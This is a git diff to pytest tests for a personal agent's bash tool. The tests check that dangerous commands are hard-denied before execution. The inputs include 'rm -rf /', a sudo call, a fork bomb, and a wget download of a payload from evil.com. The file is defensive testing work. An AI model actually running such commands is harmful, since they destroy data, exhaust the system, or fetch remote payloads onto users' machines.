@@ -11,6 +11,7 @@ from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
 
+from personal_agent.telemetry.trace import TraceContext
 from personal_agent.tools.primitives.bash import (
     _FALLBACK_DENY,
     _is_hard_denied,
@@ -18,6 +19,8 @@ from personal_agent.tools.primitives.bash import (
     bash_executor,
     bash_tool,
 )
+
+_CTX = TraceContext.new_trace()
 
 
 # ---------------------------------------------------------------------------
@@ -51,10 +54,8 @@ def _make_mock_proc(
 @pytest.mark.asyncio
 async def test_hard_deny_rm_rf() -> None:
     """'rm -rf /' must be hard-denied before subprocess creation."""
-    with patch(
-        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
-    ) as mock_exec:
-        result = await bash_executor("rm -rf /")
+    with patch("personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec") as mock_exec:
+        result = await bash_executor("rm -rf /", ctx=_CTX)
 
     mock_exec.assert_not_called()
     assert result["success"] is False
@@ -64,10 +65,8 @@ async def test_hard_deny_rm_rf() -> None:
 @pytest.mark.asyncio
 async def test_hard_deny_sudo() -> None:
     """'sudo whoami' must be hard-denied."""
-    with patch(
-        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
-    ) as mock_exec:
-        result = await bash_executor("sudo whoami")
+    with patch("personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec") as mock_exec:
+        result = await bash_executor("sudo whoami", ctx=_CTX)
 
     mock_exec.assert_not_called()
     assert result["success"] is False
@@ -77,10 +76,8 @@ async def test_hard_deny_sudo() -> None:
 @pytest.mark.asyncio
 async def test_hard_deny_fork_bomb() -> None:
     """Fork bomb pattern must be hard-denied."""
-    with patch(
-        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
-    ) as mock_exec:
-        result = await bash_executor(":(){ :|:& };:")
+    with patch("personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec") as mock_exec:
+        result = await bash_executor(":(){ :|:& };:", ctx=_CTX)
 
     mock_exec.assert_not_called()
     assert result["success"] is False
@@ -89,11 +86,9 @@ async def test_hard_deny_fork_bomb() -> None:
 
 @pytest.mark.asyncio
 async def test_hard_deny_wget() -> None:
-    """wget must be hard-denied."""
-    with patch(
-        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
-    ) as mock_exec:
-        result = await bash_executor("wget http://evil.com/payload.sh")
+    """Wget must be hard-denied."""
+    with patch("personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec") as mock_exec:
+        result = await bash_executor("wget http://evil.com/payload.sh", ctx=_CTX)
 
     mock_exec.assert_not_called()
     assert result["success"] is False
@@ -113,7 +108,7 @@ async def test_unclosed_quote_fails_via_bash() -> None:
     subprocess was spawned.  Now the command is passed directly to /bin/bash
     which exits non-zero with a syntax-error message in stderr.
     """
-    result = await bash_executor("echo 'unclosed")
+    result = await bash_executor("echo 'unclosed", ctx=_CTX)
     assert result["success"] is False
     # bash reports a syntax error and exits with code 2
     assert result.get("exit_code") in (1, 2)
@@ -135,7 +130,7 @@ async def test_happy_path() -> None:
         "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
         new=AsyncMock(return_value=mock_proc),
     ):
-        result = await bash_executor("echo hello")
+        result = await bash_executor("echo hello", ctx=_CTX)
 
     assert result["success"] is True
     assert result["exit_code"] == 0
@@ -158,7 +153,7 @@ async def test_timeout() -> None:
         "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
         new=AsyncMock(return_value=mock_proc),
     ):
-        result = await bash_executor("sleep 999", timeout_seconds=1)
+        result = await bash_executor("sleep 999", timeout_seconds=1, ctx=_CTX)
 
     assert result["success"] is False
     assert result["error"] == "timeout"
@@ -196,7 +191,9 @@ async def test_output_cap_truncates_with_ctx() -> None:
         return original_path(*args)  # type: ignore[arg-type]
 
     mock_overflow = MagicMock()
-    mock_overflow.__str__ = lambda self: "/tmp/test_agent_scratch/test-trace-overflow/bash_output_0.txt"
+    mock_overflow.__str__ = lambda self: (
+        "/tmp/test_agent_scratch/test-trace-overflow/bash_output_0.txt"
+    )
 
     mock_scratch = MagicMock()
     mock_scratch.glob.return_value = []
@@ -220,24 +217,6 @@ async def test_output_cap_truncates_with_ctx() -> None:
     # truncated_path must be set (not None) when output overflows
     assert result["truncated_path"] is not None
     # In-memory stdout + stderr must be within byte budget (+2 for UTF-8 replace tolerance)
-    total_bytes = len((result["stdout"] + result["stderr"]).encode("utf-8"))
-    assert total_bytes <= 51_200 + 2, f"Byte cap exceeded: {total_bytes}"
-
-
-@pytest.mark.asyncio
-async def test_output_cap_truncates_no_ctx() -> None:
-    """Output > 50 KiB with ctx=None sets truncated_path to '<truncated: no ctx>'."""
-    big_output = b"y" * 61_440
-    mock_proc = _make_mock_proc(exit_code=0, stdout=big_output, stderr=b"")
-
-    with patch(
-        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
-        new=AsyncMock(return_value=mock_proc),
-    ):
-        result = await bash_executor("cat bigfile", ctx=None)
-
-    assert result["truncated_path"] == "<truncated: no ctx>"
-    # In-memory output must still be within byte budget (+2 for UTF-8 replace tolerance)
     total_bytes = len((result["stdout"] + result["stderr"]).encode("utf-8"))
     assert total_bytes <= 51_200 + 2, f"Byte cap exceeded: {total_bytes}"
 
